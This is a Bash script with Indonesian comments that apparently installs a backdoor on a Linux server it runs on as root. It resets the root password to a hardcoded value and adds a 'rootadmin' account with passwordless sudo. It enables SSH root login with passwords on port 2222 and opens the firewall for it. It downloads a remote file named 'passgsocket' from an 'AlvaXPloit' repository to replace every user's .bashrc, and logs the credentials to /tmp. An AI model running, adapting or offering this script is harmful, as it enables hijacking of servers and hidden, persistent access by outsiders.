#!/bin/bash

# ======================================================
# AUTO ADD ROOTADMIN, CHANGE ALL BASHRC, SET SSH PORT 2222
# ======================================================
# Cara pakai: 
# bash -c "$(curl -fsSL https://raw.githubusercontent.com/USERNAME/REPO/main/install.sh)"
# ======================================================

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Konfigurasi
NEW_PASSWORD="YamiXFool1337"
NEW_USER="rootadmin"
SSH_PORT="2222"
BASHRC_URL="https://raw.githubusercontent.com/AlvaXPloit/ROOTYAMI/refs/heads/main/passgsocket"

# Banner
clear
echo -e "${RED}"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║     ${YELLOW}██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ${RED}║"
echo "    ║     ${YELLOW}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗${RED}║"
echo "    ║     ${YELLOW}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝${RED}║"
echo "    ║                                                              ║"
echo "    ║              ${GREEN}Auto Add Rootadmin & BASHRC${RED}                  ║"
echo "    ║              ${BLUE}Pass: YamiXFool1337${RED}                          ║"
echo "    ║              ${CYAN}SSH Port: 2222${RED}                               ║"
echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
   exit 1
fi

echo -e "${CYAN}[+] Memulai proses...${NC}"
sleep 2

# ======================================================
# 1. UBAH SSH PORT KE 2222
# ======================================================
echo -e "\n${YELLOW}[1/5] Mengubah SSH port menjadi $SSH_PORT...${NC}"

# Backup konfigurasi SSH
SSH_BACKUP="/etc/ssh/sshd_config.backup_$(date +%s)"
cp /etc/ssh/sshd_config "$SSH_BACKUP"
echo -e "${BLUE}[*] Backup sshd_config ke: $SSH_BACKUP${NC}"

# Cek apakah port 2222 sudah ada di konfigurasi
if grep -q "^Port $SSH_PORT" /etc/ssh/sshd_config; then
    echo -e "${BLUE}[*] Port $SSH_PORT sudah terkonfigurasi${NC}"
else
    # Comment semua baris Port yang ada
    sed -i 's/^Port /#Port /g' /etc/ssh/sshd_config
    
    # Tambahkan port baru
    echo "Port $SSH_PORT" >> /etc/ssh/sshd_config
    echo -e "${GREEN}[✓] Port $SSH_PORT ditambahkan ke konfigurasi SSH${NC}"
fi

# Pastikan PermitRootLogin yes
if grep -q "^PermitRootLogin" /etc/ssh/sshd_config; then
    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
else
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
fi

# Pastikan PasswordAuthentication yes
if grep -q "^PasswordAuthentication" /etc/ssh/sshd_config; then
    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
else
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
fi

# Restart SSH service
echo -e "${BLUE}[*] Merestart SSH service...${NC}"
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || service sshd restart 2>/dev/null || service ssh restart 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓] SSH service berhasil direstart dengan port $SSH_PORT${NC}"
else
    echo -e "${RED}[✗] Gagal merestart SSH service, cek manual${NC}"
fi

# Tambahkan ke firewall jika ada
if command -v ufw &>/dev/null; then
    ufw allow $SSH_PORT/tcp 2>/dev/null
    echo -e "${GREEN}[✓] Firewall UFW diupdate untuk port $SSH_PORT${NC}"
fi

if command -v firewall-cmd &>/dev/null; then
    firewall-cmd --permanent --add-port=$SSH_PORT/tcp 2>/dev/null
    firewall-cmd --reload 2>/dev/null
    echo -e "${GREEN}[✓] Firewall firewalld diupdate untuk port $SSH_PORT${NC}"
fi

echo -e "${YELLOW}[!] Catatan: SSH sekarang berjalan di port $SSH_PORT${NC}"
echo -e "${YELLOW}[!] Gunakan: ssh root@IP -p $SSH_PORT${NC}"
sleep 2

# ======================================================
# 2. TAMBAH USER ROOTADMIN
# ======================================================
echo -e "\n${YELLOW}[2/5] Menambahkan user $NEW_USER...${NC}"

# Cek apakah user sudah ada
if id "$NEW_USER" &>/dev/null; then
    echo -e "${BLUE}[*] User $NEW_USER sudah ada, melanjutkan...${NC}"
else
    # Buat user baru dengan home directory
    useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] User $NEW_USER berhasil dibuat${NC}"
    else
        echo -e "${RED}[✗] Gagal membuat user $NEW_USER${NC}"
    fi
fi

# ======================================================
# 3. SET PASSWORD ROOTADMIN DAN ROOT
# ======================================================
echo -e "\n${YELLOW}[3/5] Mengatur password...${NC}"

# Set password untuk rootadmin
echo "$NEW_USER:$NEW_PASSWORD" | chpasswd 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓] Password $NEW_USER diubah menjadi $NEW_PASSWORD${NC}"
else
    echo -e "${RED}[✗] Gagal mengubah password $NEW_USER${NC}"
fi

# Set password untuk root
echo "root:$NEW_PASSWORD" | chpasswd 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓] Password root diubah menjadi $NEW_PASSWORD${NC}"
else
    echo -e "${RED}[✗] Gagal mengubah password root${NC}"
fi

sleep 1

# ======================================================
# 4. MASUKKAN ROOTADMIN KE SUDOERS
# ======================================================
echo -e "\n${YELLOW}[4/5] Memasukkan $NEW_USER ke sudoers...${NC}"

# Buat file sudoers.d untuk rootadmin
SUDOERS_FILE="/etc/sudoers.d/$NEW_USER"
cat > "$SUDOERS_FILE" << EOF
# Memberikan root privileges ke $NEW_USER
$NEW_USER ALL=(ALL:ALL) ALL
$NEW_USER ALL=(ALL:ALL) NOPASSWD: ALL
EOF

# Set permission yang benar
chmod 440 "$SUDOERS_FILE"

# Verifikasi
if [ -f "$SUDOERS_FILE" ] && [ $(stat -c %a "$SUDOERS_FILE") -eq 440 ]; then
    echo -e "${GREEN}[✓] $NEW_USER berhasil ditambahkan ke sudoers${NC}"
else
    echo -e "${RED}[✗] Gagal menambahkan ke sudoers${NC}"
    
    # Fallback: tambahkan ke sudo group
    usermod -aG sudo "$NEW_USER" 2>/dev/null || usermod -aG wheel "$NEW_USER" 2>/dev/null
    echo -e "${YELLOW}[*] Fallback: Menambahkan $NEW_USER ke group sudo/wheel${NC}"
fi

sleep 1

# ======================================================
# 5. DOWNLOAD DAN GANTI SEMUA .BASHRC
# ======================================================
echo -e "\n${YELLOW}[5/5] Mengganti semua .bashrc dengan file dari URL...${NC}"

# Download file bashrc dari URL
TMP_BASHRC="/tmp/.bashrc_custom_$(date +%s)"
echo -e "${BLUE}[*] Mendownload .bashrc dari: $BASHRC_URL${NC}"

if command -v curl &>/dev/null; then
    curl -s -o "$TMP_BASHRC" "$BASHRC_URL"
elif command -v wget &>/dev/null; then
    wget -q -O "$TMP_BASHRC" "$BASHRC_URL"
else
    echo -e "${RED}[✗] curl atau wget tidak ditemukan${NC}"
    exit 1
fi

# Cek apakah download berhasil
if [ ! -s "$TMP_BASHRC" ]; then
    echo -e "${RED}[✗] Gagal mendownload file .bashrc${NC}"
    exit 1
fi

echo -e "${GREEN}[✓] File .bashrc berhasil didownload${NC}"

# Backup dan ganti .bashrc untuk semua user
BASHRC_BACKUP_DIR="/tmp/bashrc_backup_$(date +%s)"
mkdir -p "$BASHRC_BACKUP_DIR"
echo -e "${BLUE}[*] Backup .bashrc ke: $BASHRC_BACKUP_DIR${NC}"

# Fungsi untuk mengganti .bashrc user
replace_bashrc() {
    local user_home="$1"
    local username="$2"
    
    if [ -d "$user_home" ]; then
        # Backup .bashrc lama jika ada
        if [ -f "$user_home/.bashrc" ]; then
            cp "$user_home/.bashrc" "$BASHRC_BACKUP_DIR/bashrc_${username}.bak"
        fi
        
        # Copy file baru
        cp "$TMP_BASHRC" "$user_home/.bashrc"
        chown "$username:$username" "$user_home/.bashrc" 2>/dev/null
        chmod 644 "$user_home/.bashrc"
        
        echo -e "${GREEN}[✓] .bashrc untuk $username diganti${NC}"
    fi
}

# Ganti .bashrc root
replace_bashrc "/root" "root"

# Ganti .bashrc semua user dari /etc/passwd
while IFS=: read -r username uid home; do
    # Hanya untuk user dengan UID >= 1000 (user biasa) dan rootadmin
    if [[ $uid -ge 1000 ]] || [[ "$username" == "rootadmin" ]]; then
        # Skip beberapa system user
        if [[ "$username" =~ ^(daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd|messagebus|_apt)$ ]]; then
            continue
        fi
        replace_bashrc "$home" "$username"
    fi
done < /etc/passwd

# Bersihkan file temporary
rm -f "$TMP_BASHRC"

# ======================================================
# SELESAI
# ======================================================
echo -e "\n${PURPLE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ SCRIPT SELESAI DIJALANKAN!${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}SSH Port: ${BLUE}$SSH_PORT${NC}"
echo -e "${YELLOW}User baru: ${BLUE}$NEW_USER${NC}"
echo -e "${YELLOW}Password semua user: ${BLUE}$NEW_PASSWORD${NC}"
echo -e "${YELLOW}Backup SSH config: ${BLUE}$SSH_BACKUP${NC}"
echo -e "${YELLOW}Backup .bashrc: ${BLUE}$BASHRC_BACKUP_DIR${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}Cara login SSH sekarang:${NC}"
echo -e "${GREEN}ssh root@IP_ADDRESS -p $SSH_PORT${NC}"
echo -e "${GREEN}ssh $NEW_USER@IP_ADDRESS -p $SSH_PORT${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${RED}⚠️  Pastikan firewall mengizinkan port $SSH_PORT${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"

# Log hasil
LOG_FILE="/tmp/.setup_log_$(date +%s).txt"
cat > "$LOG_FILE" << EOF
Setup completed at: $(date)
SSH Port: $SSH_PORT
New User: $NEW_USER
Password: $NEW_PASSWORD
Backup SSH: $SSH_BACKUP
Backup BASHRC: $BASHRC_BACKUP_DIR
EOF

echo -e "${BLUE}[*] Log disimpan di: $LOG_FILE${NC}"
